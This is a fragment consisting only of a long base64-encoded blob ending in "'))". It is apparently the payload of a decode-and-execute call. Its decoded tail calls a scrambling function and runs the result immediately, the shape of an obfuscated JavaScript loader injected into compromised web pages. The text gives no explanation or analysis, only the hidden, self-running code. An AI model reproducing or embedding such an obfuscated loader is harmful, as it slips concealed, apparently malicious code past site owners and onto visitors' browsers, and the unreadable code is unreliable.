ZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
